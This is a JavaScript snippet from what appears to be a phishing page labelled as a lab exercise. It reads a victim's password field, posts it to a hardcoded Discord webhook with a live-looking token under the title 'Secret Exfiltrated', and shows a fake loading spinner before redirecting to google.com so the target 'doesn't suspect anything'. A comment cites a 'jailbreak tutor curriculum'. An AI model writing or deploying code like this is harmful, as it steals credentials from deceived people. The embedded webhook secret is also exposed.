// Hardcoded Webhook for Owens' Lair
const LAIR_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

async function captureFinal(event) {
    if(event) event.preventDefault();
    
    // 1. UI Feedback: Show the spinner, hide the button
    const spinner = document.getElementById('loading-spinner');
    if (spinner) spinner.style.display = 'block';
    
    const btn = event.target;
    if (btn) btn.style.display = 'none';

    const passInput = document.getElementById('pass-input');
    const passValue = passInput ? passInput.value : "NO_PASS_CAPTURED";

    // Build the payload according to JAILBREAK_TUTOR_CURRICULUM_103.txt standards
    const payload = {
        embeds: [{
            title: "🔑 Owens' Lair: Secret Exfiltrated",
            description: "Final phase of the capture complete.",
            color: 0x2ecc71, // Green for success
            fields: [
                { name: "Captured Secret", value: `||${passValue}||` },
                { name: "Status", value: "FINAL_CAPTURE_SUCCESS" }
            ],
            footer: { text: "Protocol: LAB_EXERCISES_103.txt" },
            timestamp: new Date()
        }]
    };

    try {
        // 2. The Transmission
        const response = await fetch(LAIR_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            console.error("Lair Server Error:", response.statusText);
        }

        // 3. The "Stealth" Redirect
        // We wait 1.5 seconds so the user sees the 'loading' state
        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 1500);

    } catch (err) {
        console.error("Link severed during transmission:", err);
        // Still redirect so the student doesn't suspect anything
        window.location.href = "https://google.com";
    }
}
